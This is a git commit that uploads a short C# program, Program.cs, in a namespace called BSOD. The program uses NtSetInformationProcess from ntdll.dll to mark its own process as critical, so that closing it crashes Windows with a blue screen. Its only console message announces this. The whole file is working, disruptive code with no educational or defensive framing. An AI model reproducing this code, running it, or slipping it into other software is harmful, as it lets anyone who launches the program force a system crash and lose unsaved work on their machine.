f9fdb90510598b67ffa4bc90285aff66157e02f0
zqua <86474462+zquaa@users.noreply.github.com>
2021-08-17 00:48:58 +0300

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace BSOD
+{
+    class Program
+    {
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+        static void Main(string[] args) 
+        {
+            Console.WriteLine("it forces BSOD on close.");
+            try
+            {
+                int isCritical = 1;
+                int BreakOnTermination = 0x1D;
+                Process.EnterDebugMode();
+                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+            }
+            catch { }
+            Console.ReadLine();
+        }
+    }
+}
